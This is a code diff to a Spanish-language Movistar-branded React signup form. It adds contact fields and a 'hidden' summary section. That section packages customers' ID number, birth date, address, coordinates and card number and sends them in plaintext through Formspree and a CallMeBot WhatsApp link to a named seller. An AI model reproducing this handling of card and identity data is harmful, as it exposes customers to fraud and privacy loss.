@@ -2,7 +2,7 @@ import React, { useState, useMemo, useRef, useEffect } from 'react';
 import {
   Wifi, Tv, Zap, MapPin, User, CreditCard, Phone, Check,
   Star, Signal, Gift, AlertCircle, MapPinned, ChevronRight,
-  Send, Loader2, CheckCircle2, XCircle, Sparkles, Navigation, Smartphone
+  Send, Loader2, CheckCircle2, XCircle, Sparkles, Navigation, Smartphone, Mail, Clock
 } from 'lucide-react';
 
 /* ============================================================
@@ -72,6 +72,24 @@ const InputField = ({ label, name, value, onChange, type = 'text', required = fa
   </div>
 );
 
+/* ---------------- SELECT REUTILIZABLE ---------------- */
+const SelectField = ({ label, name, value, onChange, options, placeholder = 'Seleccionar...' }) => (
+  <div className="flex flex-col gap-1.5">
+    <label className="text-sm font-semibold text-[#0B1A28]">{label}</label>
+    <select
+      name={name}
+      value={value}
+      onChange={onChange}
+      className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 focus:border-[#019DF4] focus:ring-2 focus:ring-[#019DF4]/20 focus:outline-none bg-white text-[#0B1A28] text-base"
+    >
+      <option value="">{placeholder}</option>
+      {options.map((opt) => (
+        <option key={opt} value={opt}>{opt}</option>
+      ))}
+    </select>
+  </div>
+);
+
 /* ============================================================
    APP
    ============================================================ */
@@ -81,7 +99,7 @@ export default function App() {
     calleAtras: '', localidad: '',
     nombre: '', dni: '', fechaNacimiento: '',
     numeroTarjeta: '', bancoEmisor: '',
-    telefonoContacto: ''
+    telefonoContacto: '', correoElectronico: '', momentoInstalacion: ''
   };
 
   const [formData, setFormData] = useState(initialFormState);
@@ -150,17 +168,48 @@ export default function App() {
     e.preventDefault();
     setStatus('submitting');
 
-    const coordsTexto = coords ? `${coords.lat}, ${coords.lng}` : 'No disponibles';
+    const coordsTexto = coords ? `${coords.lat}, ${coords.lng}` : '';
 
     /* -------- Sección 3: contenido condicional -------- */
     let seccion3Texto = '';
     if (pagaConMercadoPago) {
       seccion3Texto = 'MEDIO DE PAGO: MERCADO PAGO';
     } else if (formData.numeroTarjeta || formData.bancoEmisor) {
-      seccion3Texto = `NUMERO TARJETA: ${formData.numeroTarjeta || '-'}\nBANCO: ${formData.bancoEmisor || '-'}`;
+      seccion3Texto = `NUMERO TARJETA: ${formData.numeroTarjeta || ''}\nBANCO: ${formData.bancoEmisor || ''}`;
     } else {
       seccion3Texto = 'NO ESPECIFICADO';
     }
+
+    /* -------- Sección 5: resumen consolidado (hidden en la web) -------- */
+    const entreCalles = [formData.transversal1, formData.transversal2, formData.calleAtras]
+      .filter(Boolean)
+      .join(' / ');
+
+    const metodoPago = pagaConMercadoPago
+      ? 'MERCADO PAGO'
+      : (formData.numeroTarjeta || formData.bancoEmisor ? 'TARJETA' : '');
+
+    const seccion5Texto = [
+      `-NOMBRE COMPLETO: ${formData.nombre || ''}`,
+      `-DNI: ${formData.dni || ''}`,
+      `-FECHA DE NACIMIENTO: ${formData.fechaNacimiento || ''}`,
+      `-NOMBRE DE LA CALLE: ${formData.calle || ''}`,
+      `-NUMERO DEL HOGAR: ${formData.numero || ''}`,
+      `-ENTRE CALLES: ${entreCalles}`,
+      `-LOCALIDAD: ${formData.localidad || ''}`,
+      `-CODIGO POSTAL: `,
+      `-COORDENADAS: ${coordsTexto}`,
+      `-CORREO ELECTRONICO: ${formData.correoElectronico || ''}`,
+      `-NUMERO DE CONTACTO: ${formData.telefonoContacto || ''}`,
+      `-MOMENTO DE INSTALACION: ${formData.momentoInstalacion || ''}`,
+      `-METODO DE PAGO: ${metodoPago}`,
+      `-BANCO: ${formData.bancoEmisor || ''}`,
+      `-NUMERO DE TARJETA: ${formData.numeroTarjeta || ''}`,
+      `-TITULAR: ${formData.nombre || ''}`,
+      `-PLAN:`,
+      `-VENDEDOR: IRIGOYEN CARLOS DAMIAN`,
+      `MIGA:`
+    ].join('\n');
 
     /* -------- Cuerpo del email formateado -------- */
     const mensaje = [
@@ -186,12 +235,18 @@ export default function App() {
       '',
       'SECCION 4',
       'numero de contacto',
-      `TELEFONO: ${formData.telefonoContacto || 'No especificado'}`
+      `TELEFONO: ${formData.telefonoContacto || ''}`,
+      `CORREO: ${formData.correoElectronico || ''}`,
+      `MOMENTO DE INSTALACION: ${formData.momentoInstalacion || ''}`,
+      '',
+      'SECCION 5',
+      seccion5Texto
     ].join('\n');
 
     const data = new FormData();
     data.append('_subject', `Nueva solicitud Movistar - ${formData.nombre || 'Sin nombre'}`);
     data.append('SOLICITUD', mensaje);
+    data.append('SECCION5_RESUMEN', seccion5Texto);
 
     try {
       const res = await fetch(FORMSPREE_ENDPOINT, {
@@ -227,7 +282,12 @@ export default function App() {
           '',
           '*SECCION 4*',
           'numero de contacto',
-          `TELEFONO: ${formData.telefonoContacto || 'No especificado'}`
+          `TELEFONO: ${formData.telefonoContacto || ''}`,
+          `CORREO: ${formData.correoElectronico || ''}`,
+          `MOMENTO DE INSTALACION: ${formData.momentoInstalacion || ''}`,
+          '',
+          '*SECCION 5*',
+          seccion5Texto
         ].join('\n');
 
         const waUrl = `https://api.callmebot.com/whatsapp.php?phone=${encodeURIComponent(CALLMEBOT_PHONE)}&text=${encodeURIComponent(waText)}&apikey=${CALLMEBOT_API_KEY}`;
@@ -483,7 +543,6 @@ export default function App() {
 
             {/* ---------- SECCIÓN 3 (opcional) ---------- */}
             <FormSection number="3" title="Validar tarjeta (opcional)" icon={<CreditCard className="w-5 h-5" />}>
-              {/* Checkbox Mercado Pago */}
               <div className="md:col-span-2">
                 <label className="flex items-start gap-3 bg-[#00B1EA]/5 border border-[#00B1EA]/30 rounded-xl p-4 cursor-pointer hover:bg-[#00B1EA]/10 transition-colors">
                   <input
@@ -509,7 +568,6 @@ export default function App() {
                 </label>
               </div>
 
-              {/* Campos de tarjeta (solo si NO marcó Mercado Pago) */}
               {!pagaConMercadoPago && (
                 <>
                   <InputField
@@ -536,18 +594,38 @@ export default function App() {
             </FormSection>
 
             {/* ---------- SECCIÓN 4 (opcional) ---------- */}
-            <FormSection number="4" title="Teléfono de contacto (opcional)" icon={<Phone className="w-5 h-5" />}>
+            <FormSection number="4" title="Datos de contacto (opcional)" icon={<Phone className="w-5 h-5" />}>
+              <InputField
+                label="Teléfono / Celular"
+                name="telefonoContacto"
+                value={formData.telefonoContacto}
+                onChange={handleChange}
+                placeholder="Ej: 2804123456"
+                hint="Dejame tu número si querés que te contacte directo por WhatsApp o llamada."
+              />
+              <InputField
+                label="Correo electrónico"
+                name="correoElectronico"
+                type="email"
+                value={formData.correoElectronico}
+                onChange={handleChange}
+                placeholder="Ej: juan@email.com"
+              />
               <div className="md:col-span-2">
-                <InputField
-                  label="Teléfono / Celular"
-                  name="telefonoContacto"
-                  value={formData.telefonoContacto}
+                <SelectField
+                  label="Momento de instalación preferido"
+                  name="momentoInstalacion"
+                  value={formData.momentoInstalacion}
                   onChange={handleChange}
-                  placeholder="Ej: 2804123456 o +54 9 280 412-3456"
-                  hint="Dejame tu número si querés que te contacte directo por WhatsApp o llamada."
+                  options={['Mañana', 'Tarde', 'Indistinto']}
+                  placeholder="Seleccionar (opcional)"
                 />
               </div>
             </FormSection>
+
+            {/* ---------- SECCIÓN 5 (HIDDEN) ---------- */}
+            {/* Esta sección NO se muestra en la web. Se genera automáticamente
+                en el handleSubmit con los datos de las secciones anteriores. */}
 
             <button
               type="submit"
